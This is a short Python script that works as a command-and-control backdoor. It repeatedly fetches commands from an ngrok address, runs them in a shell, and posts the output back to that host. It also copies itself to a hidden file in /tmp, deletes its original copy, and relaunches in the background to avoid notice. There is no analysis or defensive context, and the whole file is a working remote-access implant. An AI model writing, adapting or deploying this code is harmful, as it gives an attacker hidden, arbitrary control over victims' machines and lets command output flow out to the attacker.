import os,requests,sys,subprocess,time
def run(ngrok):
	while 1:
		request = requests.get(ngrok)
		if request.status_code == 200:
			output = subprocess.Popen(request.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			requests.post(ngrok, data={'SPLITHERE': str(output.stdout.read()+output.stderr.read())})
		elif request.status_code == 502:
			time.sleep(5)
		else:
			sys.exit()
try:
	if not sys.argv[1] == 'running':
		os.system('rm '+sys.argv[0])
		sys.exit(0)
except:
	os.system('cp '+sys.argv[0]+' /tmp/.wbconfig 2>/dev/null;rm '+sys.argv[0]+' 2>/dev/null;python /tmp/.wbconfig running & 2>/dev/null')
	sys.exit(0)

run('http://595c72cd.ngrok.io')
